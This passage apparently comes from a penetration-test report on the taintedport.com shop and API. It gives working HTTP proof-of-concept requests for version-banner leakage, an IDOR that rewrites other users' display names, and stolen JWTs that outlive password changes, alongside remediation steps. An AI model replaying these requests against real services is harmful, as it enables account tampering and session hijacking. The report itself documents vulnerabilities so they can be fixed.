Any request to the Next.js front-end returns `X-Powered-By: Next.js`, and the HTML body contains the `buildId`:
```
curl -sI "https://taintedport.com/" | grep -i x-powered-by
curl -s  "https://taintedport.com/" | grep -oE 'buildId[^,]{0,60}'
```

The bundled `poc.py` automates all three checks and prints the extracted versions. `verify.py` returns exit code 0 while the vulnerability is still exploitable.



*The full exploit script is available in the annexes.*




#### Evidence


**1. Origin nginx version leaks via default 404 HTML body under /_next/static/chunks/***

*Request:*
```http
GET /_next/static/chunks/does-not-exist-bfecb5a0.js HTTP/1.1
Host: taintedport.com
Accept: */*
```

*Response:*
```http
HTTP/1.1 404 Not Found
Server: cloudflare
Cache-Control: max-age=14400
Cf-Cache-Status: MISS
Content-Type: text/html

<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.28.3</center>
</body>
</html>
```


> Cloudflare rewrites the Server header to 'cloudflare' but does not sanitise the response body. The origin nginx version (1.28.3) is exfiltrated through the default 404 error document, defeating the edge banner-stripping.



**2. PHP runtime version leaks via X-Powered-By header on the API**

*Request:*
```http
GET /wines HTTP/1.1
Host: api.taintedport.com
Accept: */*
```

*Response:*
```http
HTTP/1.1 200 OK
Server: cloudflare
X-Powered-By: PHP/8.2.31
Content-Type: application/json
```


> expose_php = On at the origin PHP-FPM. The X-Powered-By header is present on every response from api.taintedport.com and taintedport.com/api/* and reveals the exact PHP patch level.



**3. Next.js framework and buildId leak on the front-end**

*Request:*
```http
GET / HTTP/1.1
Host: taintedport.com
Accept: text/html
```

*Response:*
```http
HTTP/1.1 200 OK
Server: cloudflare
X-Powered-By: Next.js
Content-Type: text/html

... "buildId":"MdMLzaL00rgo1quVwT_MV" ...
```


> poweredByHeader defaulted to true; every rendered page advertises Next.js. In addition, the current build fingerprint (buildId MdMLzaL00rgo1quVwT_MV) is embedded verbatim in the HTML/RSC payload of every rendered page.





#### Remediation

Suppress version banners at every layer of the stack, and strip them defensively at the edge.

1. **nginx (origin)** — set `server_tokens off;` in the `http {}` block and configure a custom static 404 page that does not include the server banner:
   ```nginx
   http {
     server_tokens off;
     server {
       error_page 404 /404.html;
       location = /404.html { root /var/www/errors; internal; }
     }
   }
   ```
   After deploying, purge Cloudflare's cache for the `/_next/static/chunks/*` 404 entries (currently cached for 4 hours per `Cache-Control: max-age=14400`).

2. **PHP-FPM** — set `expose_php = Off` in `php.ini` (or the corresponding pool `.conf` file) and reload PHP-FPM. Verify with:
   ```
   curl -sI https://api.taintedport.com/wines | grep -i x-powered-by
   ```
   The header should no longer appear.

3. **Next.js** — set `poweredByHeader: false` in `next.config.js`:
   ```js
   module.exports = {
     poweredByHeader: false,
     // ... existing configuration
   };
   ```
   Rebuild and redeploy. If the deployed `buildId` is considered sensitive, set a deterministic non-descriptive value via the `generateBuildId` config option.

4. **Cloudflare (defence in depth)** — add a Transform Rule (or a Worker) that strips `X-Powered-By`, `X-Nextjs-Cache`, and any other fingerprinting headers from all responses. Optionally rewrite origin 404 bodies to a fixed template.

5. **Regression verification** — re-run the provided `verify.py`; it should print `[NOT VULNERABLE]` and exit with code 1 once all three banners are removed.

---


### vuln-0011: Horizontal IDOR on PUT /auth/profile via body user_id override — attacker can rewrite any user's display name










**Severity:** MEDIUM | **CVSS:** 5.0 | **Endpoint:** `/auth/profile` | **Method:** PUT | **CWE:** CWE-639 | **CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:L/A:N`

#### Description

The `PUT /auth/profile` endpoint on the taintedport.com API selects the target row of its UPDATE using a `user_id` value taken from the JSON request body, instead of using the authenticated `user_id` claim from the caller's JWT. Any authenticated user — including a freshly self-registered account with no prior state — can therefore overwrite the `name` column of any other user by supplying `"user_id": <victim_id>` in the request body.

The stored `name` is surfaced publicly across the application: it is echoed as `user_name` on the unauthenticated `GET /wines/{id}/reviews` listing and as `owner_name` on order detail endpoints. Rewriting a victim's name silently attributes their existing content (reviews, orders) to an attacker-chosen string, and enables identity-swap attacks for phishing and social-engineering pivots.

Restricted-mass-assignment probing was performed on the same endpoint: parallel attempts to bind `email`, `password`, and `is_admin` on the victim row were silently ignored. The bug is therefore scoped strictly to display-name tampering — no direct account takeover or privilege escalation via this vector today. However, a future change that adds any additional bindable field to the endpoint would immediately promote this to a critical account-takeover primitive (see Conditions for Severity Increase).


#### Attack Flow

```
┌────────────────────────────────────────────────────────────────────────┐
│  Horizontal IDOR — PUT /auth/profile (body user_id override)           │
└────────────────────────────────────────────────────────────────────────┘

  Prerequisites:
    • Self-registration is open (POST /auth/register → 201 + JWT)
    • Victim's numeric user_id is a 1..N auto-increment integer
      (leaked via GET /wines/{id}/reviews and GET /orders/{id})

  ┌───────────┐                                        ┌────────────────┐
  │ ATTACKER  │                                        │  TAINTEDPORT   │
  │  (any     │                                        │      API       │
  │  user)    │                                        │                │
  └─────┬─────┘                                        └────────┬───────┘
        │                                                       │
   ┌────┴────┐  ① POST /auth/register {email,password}          │
   │ Phase 1 ├──────────────────────────────────────────────────►
   │ acquire │  201 Created {token: <JWT sub=user_id 445>,      │
   │  JWT    │◄──────────────  user:{id:445, ...}}              │
   └────┬────┘                                                   │
        │                                                       │
   ┌────┴────┐  ② PUT /auth/profile                             │
   │ Phase 2 │     Authorization: Bearer <JWT for user_id 445>  │
   │ exploit │     Content-Type: application/json               │
   │         │     {"user_id": 446, "name": "PWNED"}            │
   │         ├──────────────────────────────────────────────────►
   │         │                                                   │
   │         │    ┌──────────────────────────────────────────┐  │
   │         │    │  ROOT CAUSE (server-side)                │  │
   │         │    │  UPDATE users SET name = :body_name      │  │
   │         │    │  WHERE user_id = :body_user_id ← UNSAFE  │  │
   │         │    │                                          │  │
   │         │    │  Should use JWT claim, not body field:   │  │
   │         │    │  WHERE user_id = :jwt_user_id            │  │
   │         │    └──────────────────────────────────────────┘  │
   │         │                                                   │
   │         │  200 OK {user:{id:446, name:"PWNED", ...}}       │
   │         │◄──────────────────────────────────────────────────
   └────┬────┘         ▲                                         │
        │              │                                         │
        │              └─ server confirms write targeted         │
        │                 user_id 446 (VICTIM), not the caller.  │
        │                                                       │
   ┌────┴────┐  ③ Downstream impersonation:                     │
   │ Phase 3 │     GET /wines/1/reviews  (unauthenticated)      │
   │ impact  ├──────────────────────────────────────────────────►
   │         │  200 OK  [ { id: 126,                            │
   │         │            comment:"legit victim review",        │
   │         │            user_name: "PWNED"  ← changed         │
   │         │          }, ... ]                                │
   │         │◄──────────────────────────────────────────────────
   └────┬────┘                                                   │
        │                                                       │
   ┌────┴────┐  ④ Independent verification (as victim):         │
   │ verify  │     GET /auth/me                                 │
   │         │     Authorization: Bearer <VICTIM JWT — 446>     │
   │         ├──────────────────────────────────────────────────►
   │         │  200 OK {user:{id:446, name:"PWNED",             │
   │         │           is_admin:false, email:"...unchanged"}} │
   │         │◄──────────────────────────────────────────────────
   └─────────┘                                                   │
                                                                 │
  What is modified:    victim's display `name` column            │
  What is NOT affected: is_admin, email, password (verified)     │
  Public surface:      /wines/{id}/reviews, /orders/{id}         │
                                                                 │
  Detection: any PUT /auth/profile where body.user_id != jwt     │
  user_id is unambiguous exploitation.                           │
```


#### Impact

Any authenticated attacker (including a net-new self-registration) can silently change the public display name of any other user account on the platform. Directly demonstrated consequences:

* Review-author impersonation. The stored `name` is served as `user_name` on the unauthenticated `GET /wines/{id}/reviews` endpoint. An attacker can rewrite a trusted reviewer's name to a discrediting or offensive string, or rewrite their own name to a victim's identity and post reviews under that identity.
* Order-detail impersonation. The same name is served as `owner_name` on order-detail endpoints, letting an attacker plant an arbitrary identity on any order that other users (including administrators) view.
* Reputation damage / harassment. Any user's public identity can be arbitrarily changed by anyone else, with no notification to the victim.
* Chain amplifier. Combined with the existing stored-XSS/CSP weaknesses noted elsewhere, an attacker who plants a poisoned review under a victim's rewritten identity gains stealth and blast-radius.

Direct write access to `email`, `password`, and `is_admin` was tested and confirmed NOT available via this vector today, so the finding is scoped to display-name tampering only. The victim receives no warning and no in-band notification that their identity has been changed.

#### Technical Analysis

Two independent authorization failures compound in the handler for `PUT /auth/profile`:

1. Object-level authorization missing (CWE-639 / BOLA). The handler does not check that the body-supplied `user_id` matches the JWT-derived `user_id`, and no admin-role override exists either. Any authenticated principal is treated as authorized to modify any row.

2. Untrusted key used for row selection. The `user_id` field is deserialized from the request body and used verbatim in the UPDATE's WHERE clause, instead of using the trusted claim from the verified JWT.

Independent black-box verification isolated the exact untrusted field:

- Payload `{"user_id":<victim>, "name":<x>}` from an attacker JWT ⇒ the response echoes `user.id=<victim>` and a subsequent `GET /auth/me` presented with the victim's token confirms the victim's row now stores `<x>`. Attacker's own row is unchanged.
- Payload `{"id":<victim>, "name":<x>}` ⇒ the attacker's OWN row is updated (the `id` key is ignored); confirms the untrusted key is specifically `user_id`.
- Payload `{"user_id":<victim>, "name":<x>, "is_admin":1, "email":"...", "password":"..."}` ⇒ HTTP 200, name overwritten on victim row, but `is_admin`, `email`, and `password` remain unchanged (victim can still authenticate with their original password). The mass-assignment surface is narrow: only `name`.

Prerequisites are minimal. Victim identifiers are 1..N auto-increment integers already disclosed by other endpoints (e.g. `GET /wines/{id}/reviews` returns `user_name` per review — combined with an enumeration or order lookup an attacker can trivially map names to IDs). Only a valid Bearer token (any user role) is required, and self-registration is open.

Correct behavior: derive the target row's identifier exclusively from the verified JWT claim (or from a server-side session lookup) and reject or drop any body-supplied `user_id`.


#### Proof of Concept


Reproduction against `https://api.taintedport.com` (fresh accounts, no reliance on any pre-existing state):

1. Register attacker — `POST /auth/register` with `{"name":"AttOrig","email":"<random>@example.com","password":"…"}` → HTTP 201, receive a JWT and `user.id` (say attacker_id = 445).
2. Register victim (independently, for verification) — same call with a different email → HTTP 201, receive victim JWT and victim_id (say 446).
3. Exploit — send `PUT /auth/profile` with `Authorization: Bearer <attacker JWT>` and body `{"user_id": 446, "name": "PWN-BY-VALIDATOR-<ts>"}`. Server returns HTTP 200 with `user.id == 446` and `user.name == "PWN-BY-VALIDATOR-<ts>"`, even though the Bearer token belongs to user_id 445.
4. Verify write landed on victim row — `GET /auth/me` presented with the victim's token returns `name:"PWN-BY-VALIDATOR-<ts>"`. `GET /auth/me` with the attacker's token still returns the attacker's original name.
5. Verify downstream impact — have the victim post a review (`POST /wines/1/reviews`), then re-issue the rename, then hit unauthenticated `GET /wines/1/reviews`; the victim's review is now attributed to the attacker-chosen `user_name`.

Negative controls actually run:
- Payload with `id` (not `user_id`) updates the attacker's own row → identifies `user_id` as the specific untrusted key.
- Payload including `is_admin`, `email`, `password` alongside the `user_id` override: only `name` is written; victim still authenticates with original password.

Included artefacts:
- `/workspace/validation/idor-profile-user-id-override/poc/poc.py` — headed, colored, step-by-step exploit that self-registers both accounts and shows the impersonation on the public reviews listing.
- `/workspace/validation/idor-profile-user-id-override/poc/verify.py` — regression test that exits 0 (VULNERABLE) or 1 (NOT VULNERABLE).



*The full exploit script is available in the annexes.*




#### Evidence


**1. Register attacker (fresh account)**

*Request:*
```http
POST /auth/register HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"name":"AttOrig","email":"validator-att-1784547930@example.com","password":"ValidatorPw!2026"}
```

*Response:*
```http
HTTP/1.1 201 Created
Content-Type: application/json

{"success":true,"message":"User registered successfully","token":"<attacker JWT for user_id=445>","user":{"id":445,"name":"AttOrig","email":"validator-att-1784547930@example.com","is_admin":false}}
```


> Obtain a low-privilege attacker JWT by self-registration. No admin approval or email verification is required.



**2. Register victim (fresh account)**

*Request:*
```http
POST /auth/register HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"name":"VicOrig","email":"validator-vic-1784547930@example.com","password":"ValidatorPw!2026"}
```

*Response:*
```http
HTTP/1.1 201 Created

{"success":true,"token":"<victim JWT for user_id=446>","user":{"id":446,"name":"VicOrig","is_admin":false}}
```


> Establish an independent victim account so we can independently verify the write landed on the victim row.



**3. Attacker overrides victim row via body user_id**

*Request:*
```http
PUT /auth/profile HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <attacker JWT for user_id=445>
Content-Type: application/json

{"user_id": 446, "name": "PWN-BY-VALIDATOR-1784547930"}
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"message":"Profile updated successfully.","user":{"id":446,"name":"PWN-BY-VALIDATOR-1784547930","email":"validator-vic-1784547930@example.com","is_admin":0,"totp_enabled":false,"created_at":"2026-07-20 11:45:30"}}
```


> The server echoes user.id=446 (the VICTIM), even though the Bearer token belongs to user_id=445. Root cause: the UPDATE binds WHERE to the body-supplied user_id instead of the JWT claim.



**4. Victim's own /auth/me confirms row was modified**

*Request:*
```http
GET /auth/me HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <victim JWT for user_id=446>
```

*Response:*
```http
HTTP/1.1 200 OK

{"success":true,"user":{"id":446,"name":"PWN-BY-VALIDATOR-1784547930","email":"validator-vic-1784547930@example.com","is_admin":false,"totp_enabled":false,"created_at":"2026-07-20 11:45:30"}}
```


> Independent verification using the victim's own credentials - the victim's stored name is now the attacker-chosen value.



**5. Attacker /auth/me - attacker row untouched**

*Request:*
```http
GET /auth/me HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <attacker JWT for user_id=445>
```

*Response:*
```http
HTTP/1.1 200 OK

{"success":true,"user":{"id":445,"name":"AttOrig","email":"validator-att-1784547930@example.com","is_admin":false,"totp_enabled":false,"created_at":"2026-07-20 11:45:30"}}
```


> Rules out the alternative hypothesis of a mislabeled response - the attacker's own row was NOT changed; only the victim's was.



**6. Mass-assignment scoping: is_admin/email/password ignored**

*Request:*
```http
PUT /auth/profile HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <attacker JWT for user_id=448>
Content-Type: application/json

{"user_id":449,"name":"MassAssignName","is_admin":1,"email":"hijacked@evil.com","password":"hijacked"}
```

*Response:*
```http
HTTP/1.1 200 OK

{"success":true,"user":{"id":449,"name":"MassAssignName","email":"validator-vic2-1784547942@example.com","is_admin":0,"totp_enabled":false,"created_at":"2026-07-20 11:45:43"}}
```


> The name was overwritten on the victim row, but email/is_admin remained unchanged and the victim's original password still authenticates. Scoped strictly to display-name tampering.



**7. Downstream impact: public reviews show the hijacked name**

*Request:*
```http
GET /wines/1/reviews HTTP/1.1
Host: api.taintedport.com
```

*Response:*
```http
HTTP/1.1 200 OK

{"success":true,"reviews":[{"id":126,"rating":5,"comment":"validator test review","created_at":"2026-07-20 11:45:56","user_name":"ATTACKER-IMPERSONATE-1784547955"}, ...]}
```


> The victim's review is now attributed to the attacker-chosen display name on the public wine-detail reviews endpoint. No authentication is required to view this listing, so the impersonation is publicly visible.





#### Remediation

1. Derive the target row exclusively from the authenticated principal. On `PUT /auth/profile`, change the UPDATE's WHERE clause from `WHERE user_id = :body_user_id` to `WHERE user_id = :jwt_user_id`, where `jwt_user_id` comes from the verified JWT claim (or the server-side session). Any `user_id` present in the request body must be rejected or silently dropped by the deserializer — never used for row selection or content.

2. Explicit allow-list of bindable fields. The only legitimate field on this endpoint is `name`. Adopt a schema-driven request DTO (e.g. Pydantic/marshmallow/DRF serializer) that lists exactly the bindable fields; unknown or forbidden keys (`user_id`, `id`, `email`, `password`, `is_admin`, `totp_*`, `created_at`, …) must fail validation, not be filtered ad-hoc in the handler.

3. Regression tests. Add integration tests that assert:
   - An attacker cannot update another user's `name` via body-supplied `user_id`.
   - Body-supplied `user_id` and `id` fields are ignored (updates always target the caller's row).
   - Attempts to bind `is_admin`, `email`, `password` via this endpoint have no effect on the target row.
   Each test should assert both the response body and a follow-up `GET /auth/me` on the intended-victim account.

4. Audit sibling endpoints for the same pattern. `POST /cart/add`, `PUT /cart/update`, `DELETE /cart/remove/{wine_id}`, `POST /orders`, and `POST /wines/{id}/reviews` all accept a JSON body and currently ignore body-supplied `user_id`. Add negative tests to lock that invariant in place so a future refactor does not reintroduce the same bug.

5. Consider stronger contract. Rename to `PUT /auth/me` (or `PATCH /me`) semantics so no `id` appears in path or body — this makes the correct behavior obvious to future maintainers.

6. Notify users on identity changes. Even after fix, consider emailing the account owner when their `name` changes, so any residual abuse (e.g. by an insider) is visible.

---


### vuln-0018: Stateless JWTs Not Invalidated on Password or Email Change — Stolen Tokens Survive Credential Rotation (CWE-613)










**Severity:** MEDIUM | **CVSS:** 4.8 | **Endpoint:** `/auth/password` | **Method:** PUT | **CWE:** CWE-613 | **CVSS Vector:** `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N`

#### Description

The API at `api.taintedport.com` authenticates every protected endpoint using stateless HS256 JWTs with a fixed 7-day lifetime and provides no server-side revocation primitive. The `PUT /auth/password` and `PUT /auth/email` flows update the underlying user record but do not invalidate any of the caller's previously-issued tokens. There is no server-side session store, no per-user token version counter, no `jti` denylist, and no `/auth/logout` endpoint (verified 404 on `/auth/logout`, `/auth/session`, `/auth/signout`).

Consequently, a JWT that reaches an attacker via any token-theft vector (localStorage XSS, mobile-client leakage, downstream MITM, or a signing-key/forgery compromise) remains fully authoritative against every protected endpoint for the entire remaining lifetime of the token — up to seven days — regardless of whether the legitimate user performs the standard "change my password / change my email" remediation.

This was independently confirmed with a fresh throw-away account: token A obtained at registration and token B obtained by logging in both continue to authenticate `GET /auth/me`, `GET /cart`, and `GET /orders` after a successful password rotation *and* after a subsequent email rotation. Notably, the server returns the user record based purely on the `user_id` claim; the `email` claim inside the JWT is not cross-checked against the database, so a token whose `email` claim contains the old address is still honored even though the account's stored email has changed.


#### Attack Flow

```
┌──────────────────────────────────────────────────────────────────────┐
│  PRE-REQUISITE (out of scope of this finding — provided by chain):   │
│  Attacker has obtained a valid JWT for the victim via XSS on         │
│  localStorage, mobile-app leakage, JWT-forgery, MITM, etc.           │
└──────────────────────────────────────────────────────────────────────┘
                                  │
                                  ▼
    ┌───────────────────┐                  ┌────────────────────────┐
    │  Attacker          │                  │   Victim               │
    │  holds token_A     │                  │   holds token_B        │
    │  (stolen JWT)      │                  │   (live session)       │
    │  exp = iat + 7d    │                  │                        │
    └────────┬──────────┘                  └───────────┬────────────┘
             │                                          │
             │ [Phase 1] baseline access                │
             │   GET /auth/me  Bearer token_A           │
             │   ──────────────────────────►            │
             │   ◄── HTTP 200 { user }                  │
             │                                          │
             │                                          │ [Phase 2]
             │                                          │  Victim notices
             │                                          │  suspicious activity
             │                                          │  and rotates creds:
             │                                          │
             │                              PUT /auth/password
             │                              PUT /auth/email
             │                              Bearer token_B
             │                              ──────────────────►
             │                              ◄── HTTP 200 OK
             │                                          │
             │                              ┌───────────▼────────────┐
             │                              │ Server updates         │
             │                              │  users.password_hash   │
             │                              │  users.email           │
             │                              │                        │
             │                              │ Server does NOT:       │
             │                              │  • bump token_version  │
             │                              │  • denylist any jti    │
             │                              │  • touch a session     │
             │                              │    store (none exists) │
             │                              │  • shorten token exp   │
             │                              └────────────────────────┘
             │
             │ [Phase 3] AFTER victim's remediation
             │   GET /auth/me    Bearer token_A  ─► HTTP 200 { user }
             │   GET /cart       Bearer token_A  ─► HTTP 200 { items }
             │   GET /orders     Bearer token_A  ─► HTTP 200 { orders }
             │                                            ▲
             │                        ┌───────────────────┘
             │                        │   token_A is STILL AUTHORITATIVE
             │                        │   for the full remaining exp
             │                        │   (up to 7 days).
             │                        │
             │ [Phase 4] no self-service revocation exists
             │   POST /auth/logout      ─► HTTP 404
             │   DELETE /auth/session   ─► HTTP 404
             ▼

ROOT CAUSE
──────────
Stateless HS256 JWTs (payload: user_id, email, is_admin, iat, exp).
No jti, no token_version, no session store, no /auth/logout.
The auth middleware verifies signature + exp only, then loads the user
by user_id. Nothing in the payload — or in server state — changes when
the user rotates their password or email, so nothing can reject the
old token.

RECOVERY OPTIONS TODAY
──────────────────────
  (a) Wait up to 7 days for the token to expire.
  (b) Rotate the HS256 signing secret globally
      (invalidates EVERY user's session, not just the compromised one).
```


#### Impact

Standard account-recovery remediation is inoperative. A user who suspects compromise and changes their password (or password + email + 2FA) has no way to eject a live attacker: the attacker's token continues to authenticate every protected endpoint on the API for up to seven days. Recovery requires either waiting for the token to expire, or rotating the HS256 signing secret globally (which forcibly signs out every user in the system, not just the compromised account).

In isolation this is a session-management weakness — an attacker must already possess a valid JWT via a separate primitive. Chained with any token-theft vector already present on this host (XSS against localStorage-stored tokens, a JWT signing/forgery flaw, mobile-client leakage), this weakness converts a transient compromise into a durable one. The customer-visible consequence is that after any real-world token compromise the account is effectively unrecoverable through user-facing controls for the remaining life of the token.

Data at risk during the residual window includes the account's PII (`/auth/me`), cart contents (`/cart`), and full order history (`/orders`, `/orders/{id}`), as well as any state-changing capability those endpoints permit.

#### Technical Analysis

Root cause: pure stateless bearer-token authentication with no invalidation primitive.

Observed JWT structure (decoded during validation):
```
{"user_id": 492, "email": "...", "is_admin": false, "iat": 1784549071, "exp": 1785153871}
```
- `exp - iat = 604800 s` — 7-day lifetime, hard-coded.
- No `jti` claim → no per-token identifier to denylist.
- No `token_version` / `pwd_updated_at` / `sid` claim → no way for the server to reject tokens issued before the last credential change.

Server behaviour (verified end-to-end):
- `PUT /auth/password` updates the `users.password_hash` column and returns HTTP 200. No token metadata, no cache, no session store is touched.
- `PUT /auth/email` updates `users.email`, returns HTTP 200, and even issues a *fresh* JWT in the response body — suggesting the developers were aware of the "please rotate" pattern — but does nothing to invalidate the previously issued tokens.
- The authentication middleware verifies only the HS256 signature and the `exp` claim. It looks up the user by `user_id` alone; the `email` claim is not compared against the database. This was proven by presenting a token whose `email` claim contained the *pre-change* address after the email had been rotated — the server still returned the (new) user record with HTTP 200.

Absent primitives:
- `POST /auth/logout` → HTTP 404
- `GET /auth/logout` → HTTP 404
- `DELETE /auth/session` → HTTP 404
- `POST /auth/signout` → HTTP 404

The client-side `AuthProvider.logout()` simply calls `localStorage.removeItem("token")`; the token itself is never revoked server-side.

Because the JWT is self-contained and the server carries no state about which tokens are still supposed to be honored, the only server-side recovery mechanisms available today are (a) waiting for `exp`, or (b) rotating the HS256 signing key globally. Both are blunt instruments: (a) leaves a 7-day exposure window, (b) invalidates every user's session.

The correct remediation shape is either a per-user monotonic counter embedded as a claim and stored on the `users` row (rejected when `claim.tv != user.token_version`) or a small server-side denylist keyed on `jti`. Either primitive lets the server invalidate a specific user's outstanding tokens as a synchronous side effect of the password-change, email-change, 2FA-toggle, and logout flows.


#### Proof of Concept


1. Create a throw-away account: `POST /auth/register` with a random email and password. Capture the `token` field in the response — call this `token_A`.
2. Log in with the same credentials via `POST /auth/login`. Capture the `token` field — call this `token_B`. (Both `token_A` and `token_B` are independent bearer credentials, both scoped to `user_id=492`, both with 7-day exp.)
3. Confirm the baseline: `GET /auth/me` with `Authorization: Bearer <token_A>` → HTTP 200.
4. Change the account password: `PUT /auth/password` with `Authorization: Bearer <token_B>` and body `{"current_password":"<old>","new_password":"<new>"}` → HTTP 200 `"Password changed successfully."`
5. Immediately reissue the request from step 3 using `token_A` (issued *before* the password change): `GET /auth/me` with `Authorization: Bearer <token_A>` → **HTTP 200** with the user record. Same result for `GET /cart` and `GET /orders`.
6. Change the account email: `PUT /auth/email` with `Authorization: Bearer <token_B>` and body `{"password":"<new>","new_email":"<...>"}` → HTTP 200 `"Email updated successfully."` (response also contains a fresh token).
7. Reissue `GET /auth/me` with `token_A` one more time → **HTTP 200**. The returned `user.email` is the *new* email, while `token_A`'s `email` claim contains the *old* email — confirming the server authenticates on `user_id` only.
8. Attempt to invalidate the token via any standard logout path: `POST /auth/logout`, `GET /auth/logout`, `DELETE /auth/session`, `POST /auth/signout` — all return HTTP 404. No server-side revocation is possible.



*The full exploit script is available in the annexes.*




#### Evidence


**1. Register account — server returns token_A (JWT with 7-day exp)**

*Request:*
```http
POST /auth/register HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"name":"V","email":"valpoc+e02eb7ea22@example.com","password":"InitialPw123!"}
```

*Response:*
```http
HTTP/1.1 201 Created
Content-Type: application/json

{"success":true,"message":"User registered successfully","token":"<token_A>"}
```


> token_A payload decodes to {user_id:492, email:..., is_admin:false, iat:1784549071, exp:1785153871} — exp-iat = 604800s (7 days). No jti, no version claim.



**2. Login the same account — server issues token_B**

*Request:*
```http
POST /auth/login HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"email":"valpoc+e02eb7ea22@example.com","password":"InitialPw123!"}
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"token":"<token_B>"}
```


> token_A and token_B are independent bearer credentials. Both must be individually invalidated on credential change; neither will be.



**3. token_A authenticates GET /auth/me BEFORE any change**

*Request:*
```http
GET /auth/me HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <token_A>
```

*Response:*
```http
HTTP/1.1 200 OK

{"success":true,"user":{"id":492,"name":"V","email":"valpoc+e02eb7ea22@example.com","is_admin":false,"totp_enabled":false,"created_at":"2026-07-20 12:04:31"}}
```


> Baseline — token_A works as expected.



**4. Legitimate password change via token_B**

*Request:*
```http
PUT /auth/password HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <token_B>
Content-Type: application/json

{"current_password":"InitialPw123!","new_password":"ChangedPw456!"}
```

*Response:*
```http
HTTP/1.1 200 OK

{"success":true,"message":"Password changed successfully."}
```


> Password successfully rotated in the database. Server does NOT bump any token version, does NOT clear any session store — because none exists.



**5. token_A (issued BEFORE the password change) still authenticates /auth/me**

*Request:*
```http
GET /auth/me HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <token_A>
```

*Response:*
```http
HTTP/1.1 200 OK

{"success":true,"user":{"id":492,"name":"V","email":"valpoc+e02eb7ea22@example.com","is_admin":false,"totp_enabled":false,"created_at":"2026-07-20 12:04:31"}}
```


> *** VULNERABILITY *** — password rotation had no effect on the previously-issued token. A stolen JWT survives the user's remediation.



**6. token_A also authenticates other protected endpoints**

*Request:*
```http
GET /cart HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <token_A>

---
GET /orders HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <token_A>
```

*Response:*
```http
HTTP/1.1 200 OK
{"success":true,"items":[],"total":0}

---
HTTP/1.1 200 OK
{"success":true,"orders":[]}
```


> The stolen token retains full authorization across the API surface, not just /auth/me.



**7. User escalates remediation — email change via token_B**

*Request:*
```http
PUT /auth/email HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <token_B>
Content-Type: application/json

{"password":"ChangedPw456!","new_email":"changed+131f6bab@example.com"}
```

*Response:*
```http
HTTP/1.1 200 OK

{"success":true,"message":"Email updated successfully.","token":"<fresh_token>"}
```


> Server returns a fresh token in the response — hinting at intended rotation — but does not revoke the previous tokens.



**8. token_A still authenticates AFTER both password AND email change**

*Request:*
```http
GET /auth/me HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <token_A>
```

*Response:*
```http
HTTP/1.1 200 OK

{"success":true,"user":{"id":492,"name":"V","email":"changed+131f6bab@example.com","is_admin":false,"totp_enabled":false,"created_at":"2026-07-20 12:04:31"}}
```


> *** VULNERABILITY *** — full remediation flow (password + email) is bypassed. Note the returned user.email is the NEW email, yet token_A's email claim is the OLD one — the server authenticates on user_id only and does not cross-check the email claim against the DB.



**9. No /auth/logout endpoint exists (4 candidate paths tested)**

*Request:*
```http
POST /auth/logout   ---   GET /auth/logout   ---   DELETE /auth/session   ---   POST /auth/signout
```

*Response:*
```http
HTTP/1.1 404 Not Found (all four)
```


> There is no server-side revocation primitive at all. Recovery requires either waiting up to 7 days for exp, or rotating the JWT signing secret globally (which would invalidate every user's session).





#### Remediation

1. Introduce a per-user monotonic counter on the `users` row (e.g. `token_version INTEGER NOT NULL DEFAULT 0`). Embed the value as a `tv` claim in every issued JWT. In the authentication middleware, after signature verification, reject the token if `claim.tv != user.token_version`.
2. Increment `token_version` as a side effect of every operation that should invalidate outstanding sessions: password change, email change, 2FA enable/disable, admin-forced signout, account deactivation, and (see below) explicit user logout.
3. Add a real `POST /auth/logout` endpoint that increments `token_version` (or, if a denylist is preferred, writes the `jti` of the presented token to a short-lived denylist store keyed to the token's remaining lifetime).
4. Shorten the JWT lifetime from 7 days to a value proportional to the sensitivity of the actions the token permits (15 minutes is typical for an access token) and issue a rotating refresh token that IS server-side revocable — so a full-lifetime revocation is always available.
5. On `PUT /auth/password` and `PUT /auth/email`, respond with a fresh token (as is already done for the email endpoint) and encourage clients to replace the old one. This is a usability improvement — not the security control. The security control is the server-side rejection from step 1.
6. Cross-check `email` (and any other identity-bearing claim) against the database on every request, or drop the claim from the token entirely to avoid stale-data confusion.
7. Deployment step: after shipping the fix, invalidate every currently-issued JWT by bumping `token_version` for all users (or rotating the HS256 signing secret) to close the window during which tokens were issued under the vulnerable design.

---


### vuln-0019: Missing Quantity Validation on PUT /cart/update Allows Arbitrary Cart Total Manipulation










**Severity:** MEDIUM | **CVSS:** 4.3 | **Endpoint:** `/cart/update` | **Method:** PUT | **CWE:** CWE-20 | **CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N`

#### Description

The cart update endpoint `PUT /cart/update` at `https://api.taintedport.com` accepts arbitrary integer values in the `quantity` field, in direct violation of the domain invariant that is correctly enforced by the sibling endpoint `POST /cart/add` (`1 <= quantity <= 12`). Any authenticated user can supply values that are negative, zero, or as large as `INT_MAX` (`2147483647`); the server responds `HTTP 200 {"success":true,"message":"Cart updated"}` and the cart row is persisted with the attacker-supplied quantity. Non-positive quantities silently delete the cart row instead of producing an error.

Because item subtotals and the cart total are computed as `price * quantity`, an attacker can drive the cart total to any value between zero and roughly `5.15 × 10^11` EUR per line. A subsequent `POST /orders` will consume this cart state and create a real order at the manipulated total.

